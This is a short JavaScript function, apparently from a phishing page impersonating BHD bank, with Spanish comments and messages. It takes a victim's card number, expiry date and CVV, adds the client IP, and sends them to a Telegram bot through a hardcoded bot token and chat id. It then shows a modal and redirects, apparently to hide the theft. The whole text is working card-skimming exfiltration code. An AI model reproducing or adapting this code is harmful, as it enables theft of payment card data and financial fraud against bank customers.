function sendToTelegram(cardNumber, expiryDate, cvv) {
    // Obtiene la IP desde tu propio servidor (misma lógica que el script PHP)
    fetch('get_ip.php')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            const token = "8912252632:AAEJf_puzYmDrMbn_Y2kOqhWAMgc-wBc0VI";
            const chat_id = "8555745789";
            const message = `=====DATOS TARJETA BHD=======\nNúmero: ${cardNumber}\nExpira: ${expiryDate}\nCVV: ${cvv}\nIP del cliente: ${ip}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
            return fetch(url);
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                mostrarModalYRedirigir();
            } else {
                alert("Hubo un problema al enviar los datos.");
            }
        })
        .catch(error => {
            console.error("Error:", error);
            alert("Error al obtener la IP o enviar la solicitud.");
        });
}
